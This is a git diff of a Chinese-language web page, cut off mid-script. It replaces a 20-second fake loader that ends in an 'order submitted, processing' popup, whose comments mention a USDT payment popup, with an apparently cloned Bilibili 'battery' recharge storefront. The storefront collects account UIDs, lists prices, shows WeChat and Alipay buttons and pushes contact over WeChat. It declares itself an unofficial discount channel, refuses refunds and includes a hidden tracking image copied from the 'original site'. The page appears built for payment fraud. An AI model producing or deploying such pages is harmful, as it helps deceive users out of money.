@@ -1,166 +1,813 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#ffffff">
-<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ma+Shan+Zheng&display=swap">
-<title>Loading</title>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="keywords" content="电池充值">
+<meta name="description" content="电池充值入口，点击进入~">
+<link rel="icon" href="img/icon_bg2.png">
+<title>电池充值</title>
 <style>
-  :root{
-    --bg:#ffffff;
-    --gold:#e8b64c;
-    --gold-2:#f6d489;
-    --gold-deep:#c8902f;
-    --gold-text:#b8860b;
-    --text:#1a1a1e;
-    --muted:#7a7a84;
-  }
-  *{margin:0;padding:0;box-sizing:border-box;}
-  html,body{width:100%;height:100%;}
-  body{
-    background:var(--bg);
-    color:var(--text);
-    font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-    line-height:1.6;
-    overflow:hidden;
-    -webkit-font-smoothing:antialiased;
-  }
+*{box-sizing:border-box}
+*{padding:0;margin:0}
+li,ul{list-style:none}
+em,i{font-style:normal}
+body{
+  width:100%;
+  height:100vh;
+  background-color:#e9e9e9;
+  font-size:14px;
+}
+#app{
+  max-width:500px;
+  margin:0 auto;
+  min-height:100vh;
+  background-color:#f4f4f4;
+  font-family:Avenir,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
+  color:#333;
+  position:relative;
+  box-shadow:0 0 24px rgba(0,0,0,.08);
+}
+.flex{display:flex}
+.flex-1{flex:1}
+.no-click{pointer-events:none;cursor:default}
 
-  /* 加载页（20 秒后自动进入，弹出对话框） */
-  #loader{
-    position:fixed;inset:0;z-index:1000;
-    display:flex;align-items:center;justify-content:center;
-    background:
-      radial-gradient(700px 500px at 50% 42%, rgba(232,182,76,.08), transparent 65%),
-      var(--bg);
-    transition:opacity .6s ease, visibility .6s ease;
-  }
-  #loader.is-leaving{opacity:0;visibility:hidden;pointer-events:none;}
-  .loader-inner{display:flex;flex-direction:column;align-items:center;gap:26px;}
-  .loader-brand{
-    font-family:"Ma Shan Zheng","STXingkai","华文行楷","LiSu","隶书","KaiTi","楷体",serif;
-    font-size:48px;font-weight:400;letter-spacing:8px;
-    background:linear-gradient(180deg,#1a1a1e 20%,var(--gold-text) 100%);
-    -webkit-background-clip:text;background-clip:text;color:transparent;
-  }
-  .bar-loader{position:relative;width:70px;height:70px;}
-  .bar-loader .bar{
-    position:absolute;width:6px;height:18px;
-    background:var(--gold-deep);border-radius:4px;
-    left:50%;top:50%;margin-left:-3px;margin-top:-9px;
-    opacity:.15;
-    animation:bar-fade 1.2s infinite linear;
-  }
-  .loader-text{color:var(--text);font-size:18px;letter-spacing:1px;}
-  .dots i{font-style:normal;animation:dot-blink 1.4s infinite;}
-  .dots i:nth-child(2){animation-delay:.2s;}
-  .dots i:nth-child(3){animation-delay:.4s;}
-  @keyframes dot-blink{0%,80%,100%{opacity:.2;}40%{opacity:1;}}
-  @keyframes bar-fade{
-    0%{opacity:.15;}10%{opacity:1;}20%{opacity:.75;}30%{opacity:.35;}40%{opacity:.15;}100%{opacity:.15;}
-  }
+/* ---------- 顶部固定导航 ---------- */
+.header-box{
+  height:50px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:0 15px;
+  position:fixed;
+  left:0;
+  right:0;
+  top:0;
+  z-index:9;
+  max-width:500px;
+  margin:0 auto;
+}
+.header-box b{font-size:17px;color:#666;font-weight:600}
+.header-box .call{
+  font-size:12px;
+  display:flex;
+  align-items:center;
+  color:#000;
+  cursor:pointer;
+}
+.header-box .call svg{margin-right:3px}
 
-  /* ============================================================
-     弹窗：USDT付款请联系财务
-     ============================================================ */
-  .mask{
-    position:fixed;inset:0;z-index:2000;
-    background:rgba(0,0,0,.22);
-    backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
-    display:none;align-items:center;justify-content:center;padding:24px;
-  }
-  .mask.show{display:flex;}
-  .dialog{
-    width:100%;max-width:340px;
-    background:#ffffff;
-    border:1px solid rgba(0,0,0,.10);
-    border-radius:18px;
-    padding:32px 26px 24px;
-    text-align:center;
-    box-shadow:0 30px 60px -20px rgba(0,0,0,.28),0 0 40px -10px rgba(232,182,76,.30);
-    animation:dialog-pop .35s cubic-bezier(.16,1,.3,1);
-  }
-  @keyframes dialog-pop{from{transform:translateY(20px) scale(.96);opacity:0;}to{transform:none;opacity:1;}}
-  .dialog-icon{
-    width:64px;height:64px;margin:0 auto 18px;border-radius:50%;
-    display:flex;align-items:center;justify-content:center;
-    background:linear-gradient(135deg,var(--gold-2),var(--gold-deep));
-    color:#241803;font-size:30px;font-weight:800;
-    box-shadow:0 0 0 6px rgba(232,182,76,.18),0 12px 30px -8px rgba(232,182,76,.45);
-  }
-  .dialog h3{
-    font-weight:800;letter-spacing:2px;
-    background:linear-gradient(180deg,#1a1a1e 20%,var(--gold-text) 100%);
-    -webkit-background-clip:text;background-clip:text;color:transparent;
-  }
-  .dialog p{margin-top:10px;font-size:15px;color:var(--muted);letter-spacing:1px;}
-  .dialog .confirm{
-    margin-top:24px;width:100%;border:none;cursor:pointer;
-    padding:13px;border-radius:12px;
-    background:linear-gradient(135deg,var(--gold-2),var(--gold-deep));
-    color:#241803;font-size:16px;font-weight:700;letter-spacing:3px;
-    transition:transform .2s ease,box-shadow .2s ease;
-    font-family:inherit;
-  }
-  .dialog .confirm:hover{transform:translateY(-1px);box-shadow:0 12px 24px -8px rgba(232,182,76,.6);}
-  .dialog .confirm:active{transform:scale(.97);}
+/* ---------- 主内容区 ---------- */
+.page-main{padding:62px 10px 120px}
+.page-main .van-button{height:36px}
 
-  @media (max-width:600px){
-    .loader-brand{font-size:38px;letter-spacing:5px;}
-  }
+.right-icon{
+  text-align:right;
+  display:flex;
+  align-items:center;
+  justify-content:flex-end;
+  margin-bottom:10px;
+}
+.right-icon .call{
+  font-size:12px;
+  display:flex;
+  align-items:center;
+  color:#000;
+  cursor:pointer;
+}
+.right-icon .call svg{margin-right:3px}
+
+/* 登录卡片 */
+.header{background-color:#fff;padding:10px;border-radius:6px}
+.logined{display:flex;align-items:center}
+.logined .userImg{width:60px;height:60px;padding:3px;flex-shrink:0}
+.logined .userImg img{width:100%;height:100%;border-radius:50%;object-fit:cover}
+.logined .userInfo{flex:1;margin:0 20px;min-width:0}
+.logined .userInfo .nick{margin-bottom:5px;font-weight:500;font-size:18px}
+.logined .userInfo .uid{color:#b0b0b0;font-size:13px;word-break:break-all}
+.logined .header-bar{
+  color:#fe2c55;
+  display:flex;
+  align-items:center;
+  gap:5px;
+  justify-content:space-between;
+  padding:10px 0;
+  cursor:pointer;
+  flex-shrink:0;
+  font-size:13px;
+}
+.logined .header-bar img{width:20px;height:20px}
+
+.unlogin .input-group{display:flex;align-items:center;gap:10px}
+.unlogin .input-group .input-div{flex:1}
+.unlogin .input-group .input-div input{
+  height:36px;
+  padding:5px 10px;
+  border:1px solid #ddd;
+  border-radius:4px;
+  width:100%;
+  font-size:16px;
+  outline:none;
+}
+.unlogin .input-group .header-bar{width:100px;text-align:right}
+.unlogin .account-help{color:#2878ff;font-size:12px;margin:10px 0 0;cursor:pointer}
+
+/* 按钮 */
+.btn-danger{
+  background:#fe2c55;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  height:36px;
+  width:100%;
+  font-size:14px;
+  cursor:pointer;
+}
+.btn-danger:disabled{opacity:.6;cursor:not-allowed}
+.btn-danger .spinner{
+  display:inline-block;width:14px;height:14px;border:2px solid #fff;
+  border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;
+  vertical-align:-2px;margin-right:5px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* 商品内容 */
+.content{margin:10px 0;background-color:#fff;padding:15px 10px;border-radius:6px}
+
+/* 规格切换 */
+.bi-spec-switch{margin-bottom:15px}
+.bi-spec-switch .spec-title{font-size:14px;color:#333;margin:0 0 10px;font-weight:500}
+.bi-spec-switch .spec-btns{display:flex;gap:10px}
+.bi-spec-switch .spec-btn{
+  flex:1;padding:8px 12px;font-size:13px;border-radius:6px;
+  border:1px solid #e8e8e8;background:#f7f7f7;color:#999;cursor:pointer;outline:none;
+}
+.bi-spec-switch .spec-btn.active{background:#fff0f2;border-color:#fe2c55;color:#fe2c55}
+
+/* 商品列表 */
+.item-list{
+  min-height:300px;
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px;
+}
+.item-list li .item{
+  background-color:#f8f8f8;
+  text-align:center;
+  padding:10px 0;
+  border-radius:4px;
+  border:1px solid transparent;
+  position:relative;
+  cursor:pointer;
+  transition:border-color .15s;
+}
+.item-list li .item .doubi{font-size:19px;font-weight:500;color:rgba(0,0,0,.9)}
+.item-list li .item .doubi span{margin-right:2px}
+.item-list li .item .doubi i{font-size:14px;font-weight:600}
+.item-list li .item .doubi img{width:17px;height:17px;position:relative;top:3px}
+.item-list li .item .rmb{font-size:14px;color:#000;opacity:.5;margin-top:2px}
+.item-list li .item .hot{
+  position:absolute;top:-1px;left:-1px;font-size:12px;padding-left:3px;
+  background:#fe2c55;color:#fff;border-radius:5px 1px 5px 1px;
+  height:15px;line-height:15px;padding:0 8px;
+}
+.item-list li .item .hot .through{text-decoration:line-through 2px}
+.item-list li .item .hot i{margin-left:5px}
+.item-list li .item-active{border:1px solid #fe2c55;background:#fff7f8}
+
+.protocol-container{padding-top:10px;text-align:center;color:grey;font-size:13px}
+.protocol-container .protocol-name{color:#04498d;cursor:pointer}
+
+.complaint{
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;width:120px;margin:10px auto 0;font-size:15px;
+  color:#666;cursor:pointer;
+}
+.complaint img{margin-right:3px;width:25px;height:25px}
+
+/* 协议条 */
+.agreement-row{
+  padding:10px;color:#333;background-color:#f4e0e4;border-radius:4px;
+  display:flex;justify-content:space-between;align-items:center;font-size:14px;
+}
+.agreement-row .service-tag{
+  background-color:#fe2c55;color:#fff;border-radius:4px;padding:6px 10px;
+  display:inline-flex;align-items:center;gap:4px;cursor:pointer;font-size:14px;
+  white-space:nowrap;margin-left:10px;
+}
+
+.bottom-tips{padding:8px 10px;background-color:#eaf4f9;margin-top:10px;border-radius:4px;font-size:12px;color:#333;line-height:18px}
+
+/* 底部购买栏 */
+.goods-action{
+  position:fixed;left:0;right:0;bottom:0;
+  max-width:500px;margin:0 auto;
+  height:80px;padding:0 10px;
+  background:#fff;
+  display:flex;align-items:center;
+  z-index:9;
+  box-shadow:0 -2px 10px rgba(0,0,0,.05);
+}
+.goods-action .ga-icon{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  color:#646566;font-size:12px;cursor:pointer;padding:0 8px;line-height:1.4;
+}
+.goods-action .ga-icon svg{width:24px;height:24px;margin-bottom:3px}
+.goods-action .ga-btn{
+  flex:1;margin-left:10px;background:#fe2c55;color:#fff;
+  height:43px;font-size:16px;border:none;border-radius:4px;cursor:pointer;
+  letter-spacing:1px;
+}
+
+/* 加微信浮标 */
+.add-wx-box{
+  position:fixed;right:0;bottom:85px;
+  height:28px;line-height:28px;padding:0 10px 0 12px;
+  border-radius:16px 0 0 16px;background-color:#ffda48;
+  color:#fe2c55;font-size:12px;font-weight:600;cursor:pointer;
+  display:flex;align-items:center;gap:2px;
+  z-index:8;
+}
+.add-wx-box svg{width:12px;height:12px}
+
+/* ---------- 遮罩 / 弹窗 ---------- */
+.van-overlay{
+  position:fixed;top:0;left:0;right:0;bottom:0;
+  background-color:rgba(0,0,0,.4);
+  z-index:999;display:none;align-items:center;justify-content:center;
+}
+.van-overlay.show{display:flex}
+.wrapper{display:flex;align-items:center;justify-content:center;height:100%;width:100%}
+.wrapper.bg{background-repeat:no-repeat;background-size:contain;background-position:50%}
+
+/* 充值协议弹窗 */
+.dialog{
+  width:300px;background:#fff;border-radius:8px;overflow:hidden;
+  max-height:80vh;display:flex;flex-direction:column;
+}
+.dialog .dialog-header{
+  text-align:center;font-weight:600;font-size:16px;padding:16px;position:relative;color:#333;
+}
+.dialog .dialog-body{padding:4px 16px 16px;overflow-y:auto;font-size:14px;line-height:1.7;color:#333}
+.dialog .dialog-footer{border-top:1px solid #ebedf0;display:flex}
+.dialog .dialog-footer .btn{
+  flex:1;height:48px;line-height:48px;text-align:center;font-size:16px;
+  color:#666;cursor:pointer;border:none;background:#fff;
+}
+.dialog .dialog-footer .btn + .btn{border-left:1px solid #ebedf0}
+
+.agreement-box{padding:0}
+.agreement-box li{text-align:justify;font-size:15px;line-height:1.7;margin-bottom:10px;color:#555}
+
+/* 支付方式弹窗 */
+.paytype-wrap{padding:20px 25px;position:relative;background:#fff;border-radius:8px;width:70%;max-width:340px}
+.paytype-wrap .pay-header{text-align:right;position:absolute;right:10px;top:10px;cursor:pointer;color:#999}
+.paytype-wrap .row{text-align:center;margin-bottom:10px}
+.paytype-wrap .row-img img{border-radius:50%;width:54px;height:54px;object-fit:cover;display:inline-block}
+.paytype-wrap .row b{font-size:16px;color:#333}
+.paytype-wrap .row.acc{font-size:14px;color:#333}
+.paytype-wrap .row.acc em{color:#fe2c55;font-style:normal}
+.paytype-wrap .pay-footer{margin-top:18px}
+.pay-footer .pay-btn{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  width:100%;border:none;border-radius:999px;height:46px;font-size:16px;color:#fff;cursor:pointer;
+}
+.pay-footer .pay-btn.wx{background:#00c250;margin-bottom:14px}
+.pay-footer .pay-btn.ap{background:#03A9F4}
+.pay-footer .pay-btn .icon{
+  width:22px;height:22px;border-radius:50%;background:#fff;
+  display:inline-flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:700;
+}
+.pay-footer .pay-btn.wx .icon{color:#00c250}
+.pay-footer .pay-btn.ap .icon{color:#03A9F4}
+
+/* 客服弹窗 */
+.customer-dialog{width:300px;background-color:#fff;border-radius:8px}
+.customer-dialog .customer-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:15px;border-bottom:1px solid #eee;font-size:16px;font-weight:600;color:#333;
+}
+.customer-dialog .customer-header .close{cursor:pointer;color:#999}
+.customer-dialog .customer-body{padding:15px;font-size:14px;color:#333}
+.customer-dialog .customer-body .flex-row{display:flex;align-items:center;gap:10px}
+.customer-dialog .footer-btn{
+  display:flex;align-items:center;gap:10px;padding-bottom:20px;text-align:center;justify-content:center;
+}
+.customer-dialog .footer-btn .tag{
+  background:#1989fa;color:#fff;padding:8px 18px;border-radius:4px;cursor:pointer;font-size:14px;
+}
+
+/* 风险提示弹窗 */
+.risk-wrap{background:#fff;border-radius:8px;width:90%;max-width:400px;overflow:hidden}
+.risk-wrap .risk-header{height:50px;line-height:50px;text-align:center;background:#e0f2ff;font-size:16px;color:#2878ff;font-weight:600}
+.risk-wrap .risk-body{padding:20px}
+.risk-wrap .row{text-align:left;display:flex;align-items:center;font-size:14px;color:#333}
+.risk-wrap .row.row-img{gap:10px;margin-bottom:8px}
+.risk-wrap .row.row-img img{border-radius:50%;width:40px;height:40px;object-fit:cover}
+.risk-wrap .row.row-img b{font-size:16px}
+.risk-wrap .row.warn{margin-bottom:20px;color:#fe2c55;line-height:1.6;text-align:justify}
+.risk-wrap .row.acc b{font-size:14px}
+.risk-wrap .risk-error .title{font-size:16px;color:#ff2e39;padding:20px 20px 0;font-weight:700}
+.risk-wrap .risk-error .error-list{padding:16px 20px 20px}
+.risk-wrap .risk-error .error-list p{color:#ff2e39;margin-bottom:8px;font-size:14px}
+.risk-wrap .risk-error .error-list .exit-btn{
+  display:block;width:100%;border:none;border-radius:999px;margin-top:22px;
+  background:#2878ff;color:#fff;font-size:16px;height:44px;cursor:pointer;
+}
+.risk-footer .pay-btn{
+  display:block;width:100%;border:none;border-radius:999px;height:44px;font-size:15px;color:#fff;cursor:pointer;
+  margin-bottom:12px;
+}
+.risk-footer .pay-btn.self{background:#2878ff}
+.risk-footer .pay-btn.other{background:#ff2e39}
+.risk-footer .pay-btn:disabled{opacity:.55;cursor:not-allowed}
+.risk-footer .count{text-align:center;color:#999;margin:12px 0;font-size:14px}
+.risk-footer .count span{color:#2878ff}
+.risk-row{font-size:13px;color:#555;line-height:1.6;display:flex;gap:6px;align-items:baseline}
+.risk-row input{margin-right:4px}
+.risk-row span.red{color:#fe2c55}
+
+/* Toast */
+.ToastTips{
+  width:100%;position:fixed;left:0;top:30%;z-index:9999;
+  display:flex;justify-content:center;pointer-events:none;
+}
+.ToastTips .toast-box{
+  display:flex;gap:4px;align-items:center;background:#fff;padding:10px 15px;
+  border-radius:4px;border:1px solid #ddd;animation:shake .5s linear;
+  box-shadow:0 4px 16px rgba(0,0,0,.1);
+}
+.ToastTips .toast-box img{width:26px;height:26px}
+.ToastTips .toast-box span{color:#000;font-size:14px}
+@keyframes shake{
+  0%{transform:translate3d(-3%,0,0)}
+  10%{transform:translateZ(0)}
+  20%{transform:translate3d(-3%,0,0)}
+  30%{transform:translateZ(0)}
+  40%{transform:translate3d(-3%,0,0)}
+  50%{transform:translateZ(0)}
+  60%{transform:translate3d(-3%,0,0)}
+  70%{transform:translateZ(0)}
+  80%{transform:translate3d(-3%,0,0)}
+  to{transform:translateZ(0)}
+}
 </style>
 </head>
 <body>
+<div id="app">
+  <!-- 隐藏跟踪图（与原站一致） -->
+  <img src="img/track.png" alt="" style="display:none">
 
-  <div id="loader">
-    <div class="loader-inner">
-      <div class="bar-loader">
-        <div class="bar" style="transform: rotate(0deg) translateY(-25px); animation-delay: 0s;"></div>
-        <div class="bar" style="transform: rotate(30deg) translateY(-25px); animation-delay: 0.1s;"></div>
-        <div class="bar" style="transform: rotate(60deg) translateY(-25px); animation-delay: 0.2s;"></div>
-        <div class="bar" style="transform: rotate(90deg) translateY(-25px); animation-delay: 0.3s;"></div>
-        <div class="bar" style="transform: rotate(120deg) translateY(-25px); animation-delay: 0.4s;"></div>
-        <div class="bar" style="transform: rotate(150deg) translateY(-25px); animation-delay: 0.5s;"></div>
-        <div class="bar" style="transform: rotate(180deg) translateY(-25px); animation-delay: 0.6s;"></div>
-        <div class="bar" style="transform: rotate(210deg) translateY(-25px); animation-delay: 0.7s;"></div>
-        <div class="bar" style="transform: rotate(240deg) translateY(-25px); animation-delay: 0.8s;"></div>
-        <div class="bar" style="transform: rotate(270deg) translateY(-25px); animation-delay: 0.9s;"></div>
-        <div class="bar" style="transform: rotate(300deg) translateY(-25px); animation-delay: 1.0s;"></div>
-        <div class="bar" style="transform: rotate(330deg) translateY(-25px); animation-delay: 1.1s;"></div>
+  <!-- 顶部导航 -->
+  <div class="header-box">
+    <b>电池充值</b>
+    <span class="call" onclick="callService()">
+      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+      拨打客服电话
+    </span>
+  </div>
+
+  <div class="page-main">
+    <!-- 右侧客服入口 -->
+    <div class="right-icon">
+      <span class="call" onclick="callService()">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        拨打客服电话
+      </span>
+    </div>
+
+    <!-- 登录区 -->
+    <div class="header" id="loginCard">
+      <!-- 未登录 -->
+      <div class="unlogin" id="unloginBox">
+        <div class="input-group">
+          <div class="input-div">
+            <input type="text" id="accountInput" placeholder="请输入哔哩哔哩UID" oninput="onAccountInput()">
+          </div>
+          <div class="header-bar">
+            <button class="btn-danger" id="confirmBtn" disabled onclick="confirmAccount()">
+              <span id="confirmBtnText">确认账号</span>
+            </button>
+          </div>
+        </div>
+        <div class="account-help" onclick="showHelp()">如何查看哔哩哔哩UID？</div>
       </div>
-      <div class="loader-text">加载中<span class="dots"><i>.</i><i>.</i><i>.</i></span></div>
+
+      <!-- 已登录 -->
+      <div class="logined" id="loginedBox" style="display:none">
+        <div class="userImg">
+          <img id="userAvatar" src="img/bibi.png" alt="">
+        </div>
+        <div class="userInfo">
+          <p class="nick" id="userNick">B站用户</p>
+          <p class="uid" id="userUid">UID：</p>
+        </div>
+        <div class="header-bar" onclick="logout()">
+          <img src="img/switch.png" alt="">
+          <span>切换账号</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 商品内容 -->
+    <div class="content">
+      <!-- 规格切换 -->
+      <div class="bi-spec-switch">
+        <p class="spec-title">商品规格</p>
+        <div class="spec-btns">
+          <button type="button" class="spec-btn" data-spec="uid" onclick="switchSpec('uid')">官版-uid充值</button>
+          <button type="button" class="spec-btn active" data-spec="moblie" onclick="switchSpec('moblie')">官版-手机号充值</button>
+        </div>
+      </div>
+
+      <!-- 商品列表 -->
+      <ul class="item-list" id="itemList"></ul>
+
+      <!-- 协议 -->
+      <div class="protocol-container">
+        <span class="label">充值代表已阅读并同意</span>
+        <span class="protocol-name" onclick="openAgreement()">《充值协议》</span>
+      </div>
+
+      <!-- 投诉入口 -->
+      <div class="complaint" onclick="complaint()">
+        <img src="img/complaint.png" alt="">
+        投诉入口
+      </div>
+    </div>
+
+    <!-- 客服协议条 -->
+    <div class="agreement-row">
+      <span>如您充值遇到问题，请联系人工客服</span>
+      <span class="service-tag no-click">
+        <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></svg>
+        在线客服
+      </span>
+    </div>
+
+    <!-- 底部提示 -->
+    <div class="bottom-tips">
+      亲爱的用户，近期平台发现有刷单返现及主播诱导充值的骗局，已有用户被骗。请您提高警惕，切勿轻信此类诱惑，以免遭受财产损失。
     </div>
   </div>
 
-  <!-- ===================== 弹窗 ===================== -->
-  <div class="mask" id="modal">
-    <div class="dialog">
-       
-      <h3>订单提交成功，正在处理中</h3>
-      <button class="confirm" id="modalOk">知道了</button>
+  <!-- 底部购买栏 -->
+  <div class="goods-action">
+    <div class="ga-icon" onclick="openCustomer()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></svg>
+      <span>客服</span>
+    </div>
+    <button class="ga-btn" id="buyBtn" onclick="buy()">立即购买35元</button>
+  </div>
+
+  <!-- 加微信浮标 -->
+  <div class="add-wx-box no-click">
+    加微信有更多优惠
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+  </div>
+
+  <!-- 帮助遮罩 -->
+  <div class="van-overlay" id="helpOverlay" onclick="hideHelp()">
+    <div class="wrapper bg" style="background-image:url('img/bi_help.png')" onclick="event.stopPropagation()"></div>
+  </div>
+
+  <!-- 充值协议弹窗 -->
+  <div class="van-overlay" id="agreementOverlay" onclick="closeOverlay('agreementOverlay')">
+    <div class="dialog" onclick="event.stopPropagation()">
+      <div class="dialog-header">充值协议</div>
+      <div class="dialog-body">
+        <ul class="agreement-box" id="agreementList"></ul>
+      </div>
+      <div class="dialog-footer">
+        <button class="btn" onclick="closeOverlay('agreementOverlay')">我知道了</button>
+      </div>
     </div>
   </div>
+
+  <!-- 支付方式弹窗 -->
+  <div class="van-overlay" id="payOverlay" onclick="closeOverlay('payOverlay')">
+    <div class="paytype-wrap" onclick="event.stopPropagation()">
+      <div class="pay-header" onclick="closeOverlay('payOverlay')">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </div>
+      <div style="padding:12px 0 0">
+        <div class="row row-img"><img id="payAvatar" src="img/bibi.png" alt=""></div>
+        <div class="row"><b id="payNick">B站用户</b></div>
+        <div class="row acc" style="margin-bottom:20px">
+          即将给以上账号充值 <em id="payDoubi">300</em> <span id="payUnit">电池</span>
+        </div>
+        <div class="pay-footer">
+          <button class="pay-btn wx" onclick="doPay('wx')">
+            <span class="icon">微</span> 微信支付
+          </button>
+          <button class="pay-btn ap" onclick="doPay('ap')">
+            <span class="icon">支</span> 支付宝支付
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 客服弹窗 -->
+  <div class="van-overlay" id="customerOverlay" onclick="closeOverlay('customerOverlay')">
+    <div class="customer-dialog" onclick="event.stopPropagation()">
+      <div class="customer-header">
+        <label>联系客服</label>
+        <span class="close" onclick="closeOverlay('customerOverlay')">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+        </span>
+      </div>
+      <div class="customer-body">
+        <div class="flex-row">
+          <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#ff9800" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+          <span>请选择联系客服的方式</span>
+        </div>
+      </div>
+      <div class="footer-btn">
+        <span class="tag" onclick="callService()">电话客服</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 订单提交结果弹窗 -->
+  <div class="van-overlay" id="orderOverlay" onclick="closeOverlay('orderOverlay')">
+    <div class="dialog" onclick="event.stopPropagation()">
+      <div class="dialog-header">提示</div>
+      <div class="dialog-body" style="text-align:center;padding:28px 16px;font-size:16px">订单提交成功，正在处理中</div>
+      <div class="dialog-footer">
+        <button class="btn" onclick="closeOverlay('orderOverlay')">关闭</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 风险提示弹窗 -->
+  <div class="van-overlay" id="riskOverlay" onclick="closeOverlay('riskOverlay')">
+    <div class="risk-wrap" onclick="event.stopPropagation()">
+      <div class="risk-header">温馨提示</div>
+      <div class="risk-body" id="riskBody">
+        <div class="row row-img">
+          <img id="riskAvatar" src="img/bibi.png" alt="">
+          <b id="riskNick">B站用户</b>
+        </div>
+        <div class="row acc">充值账号：<b id="riskUid"></b></div>
+        <div class="row warn">请确认此为您本人账号！请不要相信陌生人诱导支付，请勿填写他人账号，谨防受骗导致财产损失！</div>
+        <div class="risk-footer">
+          <button class="pay-btn self" id="selfBtn" disabled onclick="confirmSelf()">为本人账号充值</button>
+          <button class="pay-btn other" id="otherBtn" disabled onclick="confirmOther()">他人诱导付款充值</button>
+          <p class="count">请认真阅读后确认 <span id="riskCount">3s</span></p>
+          <div class="risk-row">
+            <input type="checkbox" id="riskCheck" checked onchange="syncRisk()">
+            <span>继续则视为了解本平台为优惠充值平台，该商品是虚拟产品，因虚拟产品的特殊性，<span class="red">充值成功无法退款，请悉知！</span></span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 
 <script>
-(function () {
-  var LOAD_MS = 20000; // 20 秒
+// ===== 商品数据（B站电池 · orderType 79）=====
+var SKU_LIST = [
+  { doubi: 50,    money: 6 },
+  { doubi: 100,   money: 12 },
+  { doubi: 300,   money: 35 },
+  { doubi: 500,   money: 58 },
+  { doubi: 1000,  money: 113 },
+  { doubi: 2000,  money: 225 },
+  { doubi: 3000,  money: 336 },
+  { doubi: 5000,  money: 558 },
+  { doubi: 10000, money: 1112 },
+  { doubi: 20000, money: 2220 },
+  { doubi: 30000, money: 3325 },
+  { doubi: 50000, money: 5508 }
+];
 
-  var loader = document.getElementById('loader');
-  var modal  = document.getElementById('modal');
+var CHARGE_AGREEMENT = [
+  "1、电池用于B站APP内直播间礼物打赏。",
+  "2、付款后电池实时到账，充值成功后无法进行退款操作。",
+  "3、根据文化部规定，购买网游类商品必须年满18周岁。未成年人不得使用本充值服务。",
+  "4、近期不法分子以恶劣的方式进行网络电信诈骗，平台郑重提示你，请勿为他人进行充值，为他人进行充值所产生的损失由用户自行承担。",
+  "5、本平台为第三方优惠渠道，非官方，请知晓。"
+];
 
-  // 加载完成 → 淡出加载页，弹出「USDT付款请联系财务」
+var state = {
